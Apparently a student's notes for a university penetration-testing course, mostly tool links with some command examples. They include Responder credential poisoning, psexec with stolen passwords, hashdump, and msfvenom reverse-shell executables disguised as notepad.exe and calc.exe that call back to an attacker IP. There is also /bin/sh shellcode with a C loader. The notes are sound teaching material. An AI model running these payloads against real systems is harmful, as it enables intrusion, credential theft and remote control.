# CYBERSEC 590 – Master Program Notes
## Ethical Hacking in CyberSecurity Operations (CompTIA Pentest+)

**Professor:** *Ryan Linn*

---

⚠️ **Do not hack computer systems you are not authorized to use or use them in ways that are not authorized**

---

## I. Foundational Resources & General Tools

| Link # | Title | Description | Link |
| :--- | :--- | :--- | :--- |
| 4 | Kali Linux Official Website | Penetration testing distribution. | [kali.org](https://www.kali.org/) |
| 6 | Windows CMD Commands Cheat Sheet | Reference for Windows Command Prompt commands. | [serverspace.io](https://serverspace.io/support/help/windows-cmd-commands-cheat-sheet/) |
| 7 | Linux Commands Cheat Sheet | Reference for common Linux terminal commands. | [linuxtrainingacademy.com](https://www.linuxtrainingacademy.com/linux-commands-cheat-sheet/) |
| 30 | OWASP - Open Web Application Security Project | Community-driven efforts for web application security. | [owasp.org](https://owasp.org/) |
| 31 | SANS Institute Tools | Security tools and resources from SANS. | [sans.org/tools](https://www.sans.org/tools) |
| 34 | MITRE ATT&CK Framework | Globally accessible knowledge base of adversary tactics and techniques. | [attack.mitre.org](https://attack.mitre.org/) |
| 35 | Atomic Red Team | Small, highly portable detection tests mapped to the MITRE ATT&CK framework. | [Atomic-Red-Team](https://github.com/redcanaryco/atomic-red-team) |
| 36 | List of File Signatures (Magic Numbers) | Information on file signatures for file type identification. | [wikipedia.org](https://en.wikipedia.org/wiki/List_of_file_signatures) |
| 38 | CyberChef | The Cyber Swiss Army Knife - web app for data analysis and conversion. | [gchq.github.io/CyberChef](https://gchq.github.io/CyberChef/) |

---

## II. Information Gathering & Network Scanning

### 🔍 Nmap (Network Mapper) Tasks
**Goal:** Map the network, identify active hosts, open ports, and potential vulnerabilities.

1.  Find your machine’s IP address:
    ```bash
    ip a
    ```
2.  Scan your network:
    ```bash
    nmap <Kali_IP_Address/segment_class>
    ```
3.  Scan the main server (Stealth, Version detection, Aggressive):
    ```bash
    sudo nmap -sS -sV -A <Machine_IP>
    ```
4.  Check SSH authentication methods:
    ```bash
    sudo nmap -sS -sV -A <Any_linux_machine_name> --script ssh-auth-methods
    ```
5.  Check for Slowloris vulnerability:
    ```bash
    nmap <linux_webserver_machine> --script http-slowloris-check
    ```

### Web Content Enumeration (Dirb & Nikto)

| Link # | Title | Description | Link |
| :--- | :--- | :--- | :--- |
| 2 | Comprehensive Guide on Dirb Tool | Tutorial for the web content scanner. | [hackingarticles.in](https://www.hackingarticles.in/comprehensive-guide-on-dirb-tool/) |
| 3 | Nikto Cheat Sheet | Quick reference for the web server scanner. | [highon.coffee](https://highon.coffee/blog/nikto-cheat-sheet/) |

#### 📂 Dirb Tasks
**Goal:** Enumerate hidden pages and directories in websites.

-   Search for specific extensions:
    ```bash
    dirb url -X php
    ```
-   Basic scan (uses `/usr/share/dirb/wordlists/common.txt` by default):
    ```bash
    dirb [http://exploit.local](http://exploit.local)
    ```
-   Scan with vulnerability wordlist:
    ```bash
    dirb [http://techportal.local](http://techportal.local) /usr/share/dirb/wordlists/vulns/cgis.txt
    ```
-   Ignore HTTP 400 errors and search for `.php` pages:
    ```bash
    dirb url -N 400 -X php
    ```

#### 🌐 Nikto Tasks
**Goal:** Scan web servers and identify known vulnerabilities.

1.  Quick help: `nikto -H`
2.  Main flags: `-url` or `-host` (Set target), `-Tuning` (Exclude tests)
3.  Basic scan: `nikto -url website_name`
4.  Scan multiple hosts (from a file) and specific ports:
    ```bash
    nikto -h /home/cyberuser/hostlist.txt -p 8080,443
    ```

---

## III. Protocol & Traffic Analysis (Sniffing, Man-in-the-Middle)

| Link # | Title | Description | Link |
| :--- | :--- | :--- | :--- |
| 5 | Ettercap Project Information | Suite for Man-In-The-Middle attacks. | [ettercap-project.org](https://www.ettercap-project.org/about.html) |
| 8 | DNS Hijacking Explanation | Overview of the DNS redirection attack technique. | [sentinelone.com](https://www.sentinelone.com/cybersecurity-101/threat-intelligence/dns-hijacking/) |
| 9 | Responder Sniffer Tool Documentation | Tool for LLMNR, NBT-NS and mDNS poisoning. | [kali.org/tools](https://www.kali.org/tools/responder/) |

### Wireshark (Traffic Analysis) Filters
-   Filter for specific IPv4 address: `ip.addr == 192.168.66.20`
-   Filter for destination port 53 (TCP or UDP): `tcp.dstport == 53` and `udp.dstport == 53`
-   Filter for source IP excluding ICMP: `ip.addr==192.168.200.1 and !icmp`
-   Filter for TCP packets with SYN flag set: `tcp.flags.syn == 1`
-   Filter for email traffic $\le$ 128 bytes: `frame.len <= 128 and (smtp or pop or imap)`
-   Locating DNS response by transaction ID (Example): `dns.id==0x7831`

### Reponder (Poisoning & Credential Capture)
-   Fingerprint network systems:
    ```bash
    sudo python /usr/share/responder/tools/RunFinger.py -i 10.233.20.0/23
    ```
-   Help menu: `sudo python /usr/share/responder/Responder.py -h`
-   Option to prevent active mode: `-A`
-   Run in active mode (wfrP - Web, File, SMB, POP3/IMAP/SMTP/FTP, NTLMv1/v2):
    ```bash
    sudo python /usr/share/responder/Responder.py -wfrP -I eth0
    ```

---

## IV. Exploitation Frameworks & Web Exploitation

| Title | Description | Link |
| :--- | :--- | :--- |
Metasploit Console Commands – OffSec | Reference for the Metasploit Framework command line. | [offsec.com](https://www.offsec.com/metasploit-unleashed/msfconsole-commands/) |
Burp Suite - Intercept HTTP traffic | Documentation on using the Burp proxy for HTTP/S traffic interception. | [portswigger.net](https://portswigger.net/burp/documentation/desktop/getting-started/intercepting-http-traffic) |
Impacket GitHub Repository | Python classes for working with network protocols (e.g., SMB, MSRPC). | [fortra/impacket](https://github.com/fortra/impacket) |
PowerSploit Documentation | PowerShell modules for penetration testing. | [powersploit.readthedocs.io](https://powersploit.readthedocs.io/en/latest/) |
MSF Venon |  The combination of payload generation and encoding. |  https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html|

### Metasploit Commands
-   `msfconsole`
-   `use auxiliary/scanner/smb/smb_version`
-   `show targets`
-   `show payloads`
-   `show options`
-   `meterpreter` (Post-exploitation shell)

---
### MSFVenon
`cat payload_file.bin | ./msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw`
`./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe`
 msfvenom -a x64 --platform windows -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=10.233.21.40 LPORT=4455 --smallest -f exe -o /home/cyberuser/notepad.exe
  msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=<kali_IP_address> LPORT=4455 --smallest -f exe -o /home/cyberuser/notepad.exe
  msfvenom -a x86 --platform windows -p windows/meterpreter_reverse_tcp -e x86/shikata_ga_nai LHOST=<kali_IP_address> LPORT=4455 --smallest -f exe -o /home/cyberuser/calc.exe 

  nc -lvp 6655

   msfvenom -p payload_name --list-options
    msfvenom -l formats 

## V. Windows/SMB & Active Directory Enumeration & Exploitation

| Link # | Title | Description | Link |
| :--- | :--- | :--- | :--- |
| 13 | Enum4Linux Tool Documentation | Tool for enumerating data from Windows and Samba. | [kali.org/tools](https://www.kali.org/tools/enum4linux/) |
| 14 | SMBMap Tool Documentation | Utility to list SMB share contents. | [kali.org/tools](https://www.kali.org/tools/smbmap/) |
| 15 | WMIC (Windows Management Instrumentation Command-line) | Microsoft documentation for the WMI CLI. | [microsoft.com](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmic) |
| 16 | Mimikatz Explained | Overview of the tool for extracting credentials from memory. | [varonis.com](https://www.varonis.com/blog/what-is-mimikatz) |
| 17 | CrackMapExec GitHub | Swiss Army knife for pentesting large Active Directory environments. | [byt3bl33d3r/CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) |
| 18 | SafetyKatz GitHub | Defensive fork of Mimikatz. | [GhostPack/SafetyKatz](https://github.com/GhostPack/SafetyKatz) |
| 26 | PowerView.py GitHub | Python implementation of PowerView for Active Directory enumeration. | [aniqfakhrul/powerview.py](https://github.com/aniqfakhrul/powerview.py) |
| 27 | SharpView GitHub | C\# implementation of PowerView. | [tevora-threat/SharpView](https://github.com/tevora-threat/SharpView) |
| 28 | Rubeus GitHub | C\# toolset for raw Kerberos interaction and abuse. | [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus) |

### Windows Enumeration & Reconnaissance

-   Identify IP/Network segment: `ip a`
-   Scan for Windows servers (ports 445, 389):
    ```bash
    nmap --open -p445,389 <attacker_machine_IP/segment_class>
    ```
-   Check SMB signing status:
    ```bash
    nmap --open -p445 <attacker_machine_IP/segment_class> --script smb2-security-mode
    ```

### Enum4Linux Tasks (Domain Enumeration)
-   Enumerate user accounts (`-U`):
    ```bash
    enum4linux -u <username> -p <password> -U <domainController>
    ```
-   Enumerate group members (`-G`):
    ```bash
    enum4linux -u <username> -p <password> -G <domainController> | grep "Domain Admins"
    ```
-   View password policy (`-P`):
    ```bash
    enum4linux -u <username> -p <password> -P <domainController>
    ```

### SMBMap & SMBClient Tasks
-   List SMB shares with permissions:
    ```bash
    smbmap -H <domainController> -u <username> -p <password>
    ```
-   Access shared folder and download file:
    ```bash
    smbclient //<domainController>/<shared_folder> -U <username> '<password>'
    # dir, get <file_name>, exit, cat <file_name>
    ```

### Post-Exploitation on Windows
-   **Metasploit Psexec:**
    ```bash
    use exploit/windows/smb/psexec
    set rhosts <fs-xxxxx_name_or_IP_address>
    set smbuser <username>
    set smbpass <password>
    set smbdomain stark
    exploit
    shell
    ```
-   **WMI (Windows Management Instrumentation):**
    -   Installed software: `wmic product get name,installdate`
    -   Installed updates: `wmic qfe get Caption, Description, HotFixID, InstalledOn`
-   **Local System Info (Meterpreter/Shell):**
    -   `sysinfo`, `getuid`, `getsystem`, `hashdump` (and CrackMapExec)
    -   Check privileges: `whoami /priv`
-   **Lateral Movement/Tunneling:** `psexec`, `RDP Tunneling`, `netsh interface portproxy`

---

## VI. Privilege Escalation & Persistence

| Link # | Title | Description | Link |
| :--- | :--- | :--- | :--- |
| 11 | Windows Autoruns Utility | Tool to view and manage programs configured to run at system startup. | [microsoft.com](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns) |
| 12 | Windows Process Explorer | Advanced task manager utility. | [microsoft.com](https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer) |
| 19 | LOLBAS - Living Off The Land Binaries | Project documenting native Windows binaries that can be used for malicious purposes. | [lolbas-project.github.io](https://lolbas-project.github.io/) |
| 20 | WinPEAS - Windows Privilege Escalation | Tool to check for Windows privilege escalation vectors. | [peass-ng/winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS) |
| 21 | LinPEAS - Linux Privilege Escalation | Tool to check for Linux privilege escalation vectors. | [peass-ng/linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) |
| 22 | MITRE ATT&CK: WMI (T1047) | Details on using WMI for execution. | [attack.mitre.org](https://attack.mitre.org/techniques/T1047/) |
| 29 | SharpUp GitHub | C\# tool for privilege escalation checks on Windows. | [GhostPack/SharpUp](https://github.com/GhostPack/SharpUp) |

### Buffer Overflow (Linux Example)

-   Debugging: `gdb --args ./progrm`
-   Pattern creation: `msf-pattern-create 2040`
-   Buffer with Overwrite (EIP/EBP): `perl -e 'print "a"x1036 . "BBB"`

#### Linux Shellcode Example (Execve '/bin/sh')

```c
xor   %eax,%eax
push  %eax
push  $0x68732f2f
push  $0x6e69622f
mov   %esp,%ebx
push  %eax
push  %ebx
mov   %esp,%ecx
mov   $0xb,%al
int   $0x80

#include <stdio.h>
#include <string.h>
 
char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(void)
{
    fprintf(stdout,"Length: %d\n",strlen(shellcode));
    (*(void(*)()) shellcode)();
    return 0;
}
```

VII. Detection & Defense Evasion
|	Title	| Description |	Link |
| :---  | :--- | :--- |
|Seatbelt GitHub	 | C# host enumeration tool to identify configurations that may be used by adversaries. |	[GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)
| Sysmon Documentation |	System Monitor service for detailed logging of system activity.	| [microsoft.com](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
| Abusing LOLBINs rundll32.exe Lab | Sysmon Detection	Article on detecting Living Off The Land Binaries abuse with Sysmon. |	[dev.to](https://dev.to/saravana_gautham_g/abusing-lolbins-rundll32exe-lab-sysmon-detection-170h)
| Sysmon Documentation |	System Monitor service for detailed logging of system activity.	 | [microsoft.com ](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)

